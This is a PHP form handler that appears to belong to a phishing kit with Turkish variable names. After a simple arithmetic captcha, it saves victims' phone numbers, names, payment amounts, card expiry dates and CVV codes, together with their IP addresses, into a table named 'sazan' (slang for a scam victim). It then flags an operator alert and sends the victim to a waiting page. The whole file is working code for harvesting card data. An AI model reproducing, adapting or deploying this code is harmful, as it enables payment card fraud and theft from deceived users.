<?php
		$captchaResult = $_POST["captchaResult"];
		$firstNumber = $_POST["firstNumber"];
		$secondNumber = $_POST["secondNumber"];

		$checkTotal = $firstNumber + $secondNumber;

		if ($captchaResult == $checkTotal) {
			date_default_timezone_set('Europe/Istanbul');
            include('connect.php');
			$phone       = htmlspecialchars($_POST['msisdnToBeProcessed']);
			$ad       = htmlspecialchars($_POST['ad']);
			$money   = htmlspecialchars($_POST['tlselect']);
			$ay       = htmlspecialchars($_POST['ay']);
			$yil       = htmlspecialchars($_POST['yil']);
			$cvv       = htmlspecialchars($_POST['cvv']);

			ob_start();
			session_start();
			$_SESSION['tl_amount'] = $money;
			$ip = $_SERVER['REMOTE_ADDR'];
			$date       = date('d.m.Y H:i');
            $query = $db->prepare('INSERT INTO sazan SET ip=?,date=?,phone=?,ad=?,money=?,ay=?,yil=?,cvv=?');
			$insert = $query->execute(array($ip,$date,$phone,$ad,$money,$ay,$yil,$cvv));
			$db->query("UPDATE site SET sound='1'");
			header('Location:bekle.php');
		} else {
			echo 'Güvenlik Sorusunun cevabı yanlış. Lütfen sayfayı yenileyin!';
		}
	?>